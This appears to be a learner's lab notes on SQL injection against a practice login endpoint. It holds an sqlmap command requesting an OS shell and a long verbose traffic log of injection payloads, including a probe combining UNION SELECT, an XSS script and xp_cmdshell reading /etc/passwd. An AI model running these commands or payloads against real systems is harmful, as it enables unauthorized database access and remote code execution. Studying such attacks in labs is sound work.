
גבי קודם מצא שאילתה שעזרה לו ואז הריץ sqlmap  עם פרמטרים והוא כבר ידע עם איזה פרמטרים להריץ

when we access this path:
![[Pasted image 20251019095233.png]]

we get this page:

![[Pasted image 20251019095248.png]]


however when we send parameters the url is:


![[Pasted image 20251019095311.png]]
these are two diffrenet urls
**`http://<ip>/ai/login`**

This is the **page** URL you browse to. It likely serves an HTML form (login form), JavaScript, CSS, etc.
 It's typically a **GET** request that returns the login page.

**`http://<ip>/ai/includes/user_login?email=test%40chatai.com&password=test`**

This is an **endpoint** (the form action or an AJAX request) with **query string parameters** (`email` and `password`) included in the URL.
 The `?email=...&password=...` means parameters are sent in the **URL** (i.e., a GET request or a GET-like request).
 
 seeing parameters in the URL  signals to us to test automation
 
- Tools and testers often start with the _easiest_ visible input points. A URL with clear parameters is a convenient, automatable input vector because:
    
    - It’s trivial to craft requests by changing the query string.
        
    - You can quickly observe server responses (status, returned page, errors).


this is the url when we input pararmeters:
"http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com&password=123

we can see that this is an endpoint url


sqlmap -u "http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com&password=123" -p email --os-shell -v 6
        
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:17:16 /2025-10-19/

[03:17:16] [DEBUG] cleaning up configuration parameters
[03:17:16] [DEBUG] setting the HTTP timeout
[03:17:16] [DEBUG] setting the HTTP User-Agent header
[03:17:16] [DEBUG] creating HTTP requests opener object
[03:17:16] [INFO] testing connection to the target URL

[03:17:16] [TRAFFIC OUT] HTTP request [#1]:
GET /ai/includes/user_login.php?email=test%40chatai.com&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:16] [TRAFFIC IN] HTTP response [#1] (200 OK):
Date: Sun, 19 Oct 2025 07:17:16 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 111
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com'"
    ]
}
[03:17:16] [INFO] checking if the target is protected by some kind of WAF/IPS
[03:17:16] [PAYLOAD] 8789 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#

###### packet 1 summary:
the server returned JSON that includes the original SQL fragment
that already indicates the application is reflecting or logging SQL fragments back in responses (useful for an injector).


[03:17:16] [TRAFFIC OUT] HTTP request [#2]:
GET /ai/includes/user_login.php?email=test@chatai.com&password=123&ckDz=8789 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:16] [TRAFFIC IN] HTTP response [#2] (200 OK):
Date: Sun, 19 Oct 2025 07:17:16 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 111
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com&password=123&ckDz=8789 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#


{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com'"
    ]
}


[03:17:16] [TRAFFIC OUT] HTTP request [#3]:
GET /ai/includes/user_login.php?email=test@chatai.com&password=123
HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:16] [TRAFFIC IN] HTTP response [#3] (200 OK):
Date: Sun, 19 Oct 2025 07:17:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 111
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com'"
    ]
}

[NOTE] test how the application handles quotes/parentheses/commas — i.e., to fingerprint whether input is placed inside single quotes, double quotes, or unquoted in SQL

[03:17:16] [INFO] target URL content is stable
[03:17:16] [PAYLOAD] test@chatai.com,)."'()).,  
[03:17:16] [TRAFFIC OUT] HTTP request [#4]:
GET /ai/includes/user_login.php?email=test@chatai.com,)."'()).,&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:16] [DEBUG] declared web page charset 'utf-8'
[03:17:16] [TRAFFIC IN] HTTP response [#4] (200 OK):
Date: Sun, 19 Oct 2025 07:17:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=cddufnrpgns3b0kk5qnkppa39a; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com,)."'()).,&password=123



<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:16] [WARNING] heuristic (basic) test shows that GET parameter 'email' might not be injectable
[03:17:16] [PAYLOAD] test@chatai.com'VKWGpt<'">zwmRLy

[03:17:16] [TRAFFIC OUT] HTTP request [#5]:
GET /ai/includes/user_login.php?email=test@chatai.com'VKWGpt<'">zwmRLy&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Cookie: PHPSESSID=cddufnrpgns3b0kk5qnkppa39a
Connection: close

[03:17:17] [TRAFFIC IN] HTTP response [#5] (200 OK):
Date: Sun, 19 Oct 2025 07:17:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=email=test@chatai.com'VKWGpt<'">zwmRLy&password=123 

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />


[03:17:17] [INFO] testing for SQL injection on GET parameter 'email'
[03:17:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:17:17] [PAYLOAD] test@chatai.com) AND 8265=4396 AND (3818=3818

[03:17:17] [TRAFFIC OUT] HTTP request [#6]:

GET /ai/includes/user_login.php?email=test@chatai.com) AND 8265=4396 AND (3818=3818&password=123 

HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:17] [TRAFFIC IN] HTTP response [#6] (200 OK):
Date: Sun, 19 Oct 2025 07:17:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 141
Connection: close
Content-Type: application/json
URI: http://10.10.48.19 /ai/includes/user_login.php?email=test@chatai.com) AND 8265=4396 AND (3818=3818&password=123 

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com) AND 8265=4396 AND (3818=3818'"
    ]
}
[03:17:17] [WARNING] reflective value(s) found and filtering out
[03:17:17] [DEBUG] setting match ratio for current parameter to 0.928
[03:17:17] [PAYLOAD] test@chatai.com) AND 7783=7783 AND (3215=3215

[03:17:17] [TRAFFIC OUT] HTTP request [#7]:

GET /ai/includes/user_login.php?email=test@chatai.com) AND 7783=7783 AND (3215=3215&password=123

HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:17] [TRAFFIC IN] HTTP response [#7] (200 OK):
Date: Sun, 19 Oct 2025 07:17:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 141
Connection: close
Content-Type: application/json
URI: http://10.10.48.19 /ai/includes/user_login.php?email=test@chatai.com) AND 7783=7783 AND (3215=32155&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com) AND 7783=7783 AND (3215=3215'"
    ]
}
[03:17:17] [PAYLOAD] test@chatai.com AND 5236=6182

[03:17:17] [TRAFFIC OUT] HTTP request [#8]:
GET /ai/includes/user_login.php?email=test@chatai.com AND 5236=6182&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:17] [TRAFFIC IN] HTTP response [#8] (200 OK):
Date: Sun, 19 Oct 2025 07:17:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 125
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com AND 5236=6182&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com AND 5236=6182'"
    ]
}
[03:17:17] [DEBUG] setting match ratio for current parameter to 0.928
[03:17:17] [PAYLOAD] test@chatai.com AND 7783=7783
[03:17:17] [TRAFFIC OUT] HTTP request [#9]:
GET /ai/includes/user_login.php?email=test@chatai.com AND 7783=7783&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:17] [TRAFFIC IN] HTTP response [#9] (200 OK):
Date: Sun, 19 Oct 2025 07:17:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 125
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com AND 7783=7783&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com AND 7783=7783'"
    ]
}
[03:17:17] [PAYLOAD] test@chatai.com') AND 1037=1867 AND ('UlcG'='UlcG
[03:17:17] [TRAFFIC OUT] HTTP request [#10]:
GET /ai/includes/user_login.php?email=test@chatai.com') AND 1037=1867 AND ('UlcG'='UlcG&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:17] [TRAFFIC IN] HTTP response [#10] (200 OK):
Date: Sun, 19 Oct 2025 07:17:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=53d8ikmcnsb65rjjbrf78d05o4; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: /ai/includes/user_login.php?email=test@chatai.com') AND 1037=1867 AND ('UlcG'='UlcG

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:17] [DEBUG] setting match ratio for current parameter to 0.379
[03:17:17] [PAYLOAD] test@chatai.com') AND 7783=7783 AND ('roRT'='roRT
[03:17:17] [TRAFFIC OUT] HTTP request [#11]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%29%20AND%207783%3D7783%20AND%20%28%27roRT%27%3D%27roRT&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:17] [TRAFFIC IN] HTTP response [#11] (200 OK):
Date: Sun, 19 Oct 2025 07:17:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=7ighh4ist52el6pa47v53t9s8t; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%29%20AND%207783%3D7783%20AND%20%28%27roRT%27%3D%27roRT&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:17] [PAYLOAD] test@chatai.com' AND 9214=8642 AND 'CXnI'='CXnI
[03:17:17] [TRAFFIC OUT] HTTP request [#12]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%209214%3D8642%20AND%20%27CXnI%27%3D%27CXnI&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:17] [TRAFFIC IN] HTTP response [#12] (200 OK):
Date: Sun, 19 Oct 2025 07:17:18 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 143
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%209214%3D8642%20AND%20%27CXnI%27%3D%27CXnI&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND 9214=8642 AND 'CXnI'='CXnI'"
    ]
}
[03:17:17] [DEBUG] setting match ratio for current parameter to 0.928
[03:17:17] [PAYLOAD] test@chatai.com' AND 7783=7783 AND 'cBdJ'='cBdJ
[03:17:17] [TRAFFIC OUT] HTTP request [#13]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20AND%207783%3D7783%20AND%20%27cBdJ%27%3D%27cBdJ&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:17] [TRAFFIC IN] HTTP response [#13] (200 OK):
Date: Sun, 19 Oct 2025 07:17:18 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 143
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%207783%3D7783%20AND%20%27cBdJ%27%3D%27cBdJ&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND 7783=7783 AND 'cBdJ'='cBdJ'"
    ]
}
[03:17:17] [PAYLOAD] test@chatai.com AND 9238=5192-- JFie
[03:17:17] [TRAFFIC OUT] HTTP request [#14]:
GET /ai/includes/user_login.php?email=test%40chatai.com%20AND%209238%3D5192--%20JFie&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:17] [TRAFFIC IN] HTTP response [#14] (200 OK):
Date: Sun, 19 Oct 2025 07:17:18 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 132
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%20AND%209238%3D5192--%20JFie&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com AND 9238=5192-- JFie'"
    ]
}
[03:17:17] [DEBUG] setting match ratio for current parameter to 0.928
[03:17:17] [PAYLOAD] test@chatai.com AND 7783=7783-- Pdld
[03:17:17] [TRAFFIC OUT] HTTP request [#15]:
GET /ai/includes/user_login.php?email= test@chatai.com AND 7783=7783-- Pdld&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:18] [TRAFFIC IN] HTTP response [#15] (200 OK):
Date: Sun, 19 Oct 2025 07:17:18 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 132
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%20AND%207783%3D7783--%20Pdld&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com AND 7783=7783-- Pdld'"
    ]
}
[03:17:18] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the level (2) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (comment)' because the level (2) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (comment)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' because the level (2) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' because the level (2) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the level (2) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the level (2) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the risk (3) is higher than the provided (1) 

[03:17:18] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:17:18] [PAYLOAD] (SELECT (CASE WHEN (3467=9643) THEN 'test@chatai.com' ELSE (SELECT 9643 UNION SELECT 7359) END))
[03:17:18] [TRAFFIC OUT] HTTP request [#16]:
GET /ai/includes/user_login.php?email=(SELECT (CASE WHEN (3467=9643) THEN 'test@chatai.com' ELSE (SELECT 9643 UNION SELECT 7359) END))&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:18] [TRAFFIC IN] HTTP response [#16] (200 OK):
Date: Sun, 19 Oct 2025 07:17:18 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=u0hqs9d4p92e9h3tvmg3vg3ov7; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=(SELECT (CASE WHEN (3467=9643) THEN 'test@chatai.com' ELSE (SELECT 9643 UNION SELECT 7359) END))&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', '(SELECT (CASE W...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:18] [DEBUG] setting match ratio for current parameter to 0.400
[03:17:18] [PAYLOAD] (SELECT (CASE WHEN (9326=9326) THEN 'test@chatai.com' ELSE (SELECT 9912 UNION SELECT 6444) END))
[03:17:18] [TRAFFIC OUT] HTTP request [#17]:
GET /ai/includes/user_login.php?email=(SELECT (CASE WHEN (9326=9326) THEN 'test@chatai.com' ELSE (SELECT 9912 UNION SELECT 6444) END))&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:18] [TRAFFIC IN] HTTP response [#17] (200 OK):
Date: Sun, 19 Oct 2025 07:17:18 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=ie4ugd8c3ua3jnm2iukiprof6v; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=(SELECT (CASE WHEN (9326=9326) THEN 'test@chatai.com' ELSE (SELECT 9912 UNION SELECT 6444) END))&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', '(SELECT (CASE W...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:18] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT - original value)' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int - original value)' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL)' because the level (2) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL - original value)' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE)' because the level (2) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE - original value)' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the level (2) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause' because the level (2) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (original value)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)' because the level (4) is higher than the provided (1)
